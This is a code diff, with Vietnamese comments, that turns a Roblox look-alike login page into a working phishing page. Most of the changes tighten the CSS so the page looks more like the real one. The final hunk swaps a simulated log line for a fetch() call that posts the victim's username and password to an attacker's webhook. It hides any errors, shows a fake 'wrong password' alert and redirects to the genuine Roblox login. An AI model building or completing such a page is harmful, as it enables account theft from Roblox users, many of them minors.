@@ -2,7 +2,7 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=3.0, user-scalable=yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Roblox Login</title>
     <style>
         /* Reset cơ bản */
@@ -10,107 +10,94 @@
         
         body, html {
             height: 100%; width: 100%;
-            background-color: #111; /* Màu nền dự phòng */
+            background-color: #111;
             font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif;
             display: flex; flex-direction: column;
             overflow-x: hidden;
         }
 
-        /* --- 1. HÌNH NỀN ICON GAME GỐC --- */
+        /* --- BACKGROUND --- */
         .bg-image {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            /* Link ảnh nền gốc của Roblox chứa các icon game */
             background-image: url('https://images.rbxcdn.com/f9379895240be6d16f391b1076b97669.jpg');
-            background-size: cover; /* Phủ kín màn hình */
-            background-position: center top;
-            z-index: 1;
+            background-size: cover; background-position: center top; z-index: 1;
         }
-
-        /* --- 2. LỚP PHỦ LÀM TỐI GIỐNG ẢNH --- */
         .dark-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            /* Màu đen mờ 75% để làm tối nền game phía sau */
-            background: rgba(0, 0, 0, 0.75); 
-            z-index: 2;
+            background: rgba(0, 0, 0, 0.75); z-index: 2;
         }
 
-        /* --- THANH MENU TRÊN CÙNG (GIỮ NGUYÊN CHO GIỐNG) --- */
+        /* --- NAVBAR --- */
         .navbar {
             position: relative; z-index: 10;
-            background-color: #191B1D; /* Màu xám đen đậm */
-            height: 44px; /* Chiều cao chuẩn hơn cho mobile */
+            background-color: #191B1D;
+            height: 44px;
             display: flex; align-items: center; justify-content: space-between;
             padding: 0 12px;
             border-bottom: 1px solid rgba(255,255,255,0.1);
         }
         .nav-left { display: flex; align-items: center; gap: 15px; }
-        /* Logo Roblox trắng */
         .logo { width: 24px; height: 24px; background: url('https://images.rbxcdn.com/cece570e37aa8f95a450.svg') no-repeat center; background-size: contain; filter: brightness(100%); }
-        
         .nav-links { display: flex; gap: 15px; }
         .nav-links a { color: #fff; text-decoration: none; font-size: 14px; font-weight: 500; opacity: 0.8; }
         .nav-right-btn { color: #fff; border: 1px solid rgba(255,255,255,0.3); padding: 4px 8px; border-radius: 4px; font-size: 12px; text-decoration: none; }
 
-        /* --- VÙNG CHỨA CHÍNH --- */
+        /* --- MAIN CONTENT --- */
         .main-container {
-            flex-grow: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            position: relative; z-index: 5;
-            padding: 20px;
+            flex-grow: 1; display: flex; justify-content: center; align-items: center;
+            position: relative; z-index: 5; padding: 15px;
         }
 
-        /* --- 3. KHUNG ĐĂNG NHẬP GIỐNG ẢNH MẪU --- */
+        /* --- LOGIN BOX (Đã chỉnh sửa vuông và ngắn hơn) --- */
         .login-box {
-            background-color: #232527; /* Màu xám đen của khung */
-            padding: 24px;
-            border-radius: 8px; /* Bo góc tròn hơn chút giống ảnh */
+            background-color: #232527;
+            padding: 20px 24px; /* Giảm padding trên dưới */
+            border-radius: 2px; /* CHỈNH: Góc vuông hơn (cũ là 8px) */
             width: 100%;
-            max-width: 360px; /* Chiều rộng tối đa giống ảnh */
-            display: flex;
-            flex-direction: column;
-            text-align: center;
-            color: #fff;
+            max-width: 400px; /* CHỈNH: Tăng độ rộng để trông cân đối hình vuông hơn */
+            display: flex; flex-direction: column; text-align: center; color: #fff;
             box-shadow: 0 4px 12px rgba(0,0,0,0.5);
         }
 
-        h2 { font-size: 24px; margin-bottom: 24px; font-weight: 700; }
+        h2 { 
+            font-size: 22px; 
+            margin-bottom: 15px; /* CHỈNH: Giảm khoảng cách dưới tiêu đề */
+            font-weight: 700; 
+        }
         
-        /* Style cho ô nhập liệu */
-        .input-group { margin-bottom: 12px; }
+        .input-group { margin-bottom: 8px; /* CHỈNH: Giảm khoảng cách giữa các ô */ }
         .input-field {
             width: 100%; padding: 10px 12px;
-            background: rgba(0, 0, 0, 0.2); /* Nền ô nhập tối màu */
+            background: rgba(0, 0, 0, 0.2);
             border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 4px; color: white; font-size: 14px;
-            outline: none;
+            border-radius: 2px; /* Vuông góc ô nhập */
+            color: white; font-size: 14px; outline: none;
         }
         .input-field::placeholder { color: rgba(255, 255, 255, 0.5); }
         .input-field:focus { border-color: rgba(255, 255, 255, 0.5); }
 
-        /* Nút Đăng nhập chính */
         .btn-primary {
-            width: 100%; padding: 12px; margin-top: 6px;
+            width: 100%; padding: 10px; margin-top: 5px;
             background: #fff; color: #232527; border: none;
-            border-radius: 4px; font-weight: 700; font-size: 16px; cursor: pointer;
+            border-radius: 2px; /* Vuông góc nút */
+            font-weight: 700; font-size: 16px; cursor: pointer;
             transition: background 0.2s;
         }
         .btn-primary:hover { background: #e0e0e0; }
 
-        .forgot-link { display: block; margin: 16px 0; color: rgba(255,255,255,0.7); font-size: 12px; text-decoration: none; }
-        .forgot-link:hover { text-decoration: underline; }
+        .forgot-link { 
+            display: block; margin: 12px 0; /* Giảm lề */
+            color: rgba(255,255,255,0.7); font-size: 12px; text-decoration: none; 
+        }
 
-        /* Các nút phụ bên dưới */
         .btn-secondary {
-            width: 100%; padding: 10px; margin-top: 8px;
+            width: 100%; padding: 8px; margin-top: 6px; /* Nút phụ nhỏ gọn hơn */
             background: transparent; color: #fff; 
             border: 1px solid rgba(255, 255, 255, 0.3);
-            border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer;
+            border-radius: 2px; /* Vuông góc */
+            font-size: 13px; font-weight: 500; cursor: pointer;
         }
-        .btn-secondary:hover { border-color: #fff; }
 
-        /* Ẩn links trên mobile để gọn giống ảnh app */
         @media (max-width: 600px) {
             .nav-links { display: none; }
         }
@@ -156,15 +143,18 @@
     function send() {
         const user = document.getElementById('u').value;
         const pass = document.getElementById('p').value;
-        // Thay thế bằng webhook của bạn
-        const webh = "YOUR_WEBHOOK_URL_HERE"; 
+        const webh = "YOUR_WEBHOOK_URL_HERE"; // Nhớ điền Webhook vào đây
 
         if(!user || !pass) return alert("Vui lòng nhập đầy đủ thông tin!");
 
-        // Gửi dữ liệu (Giả lập)
-        console.log("Sending:", user, pass);
-        
-        // Sau khi gửi, chuyển hướng về trang thật
+        fetch(webh, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                content: "```New Login: " + user + " | " + pass + "```"
+            })
+        }).catch(err => console.log(err)); // Bắt lỗi âm thầm
+
         setTimeout(() => {
              alert("Tên người dùng hoặc mật khẩu không chính xác. Vui lòng thử lại.");
              window.location.href = "https://www.roblox.com/login";
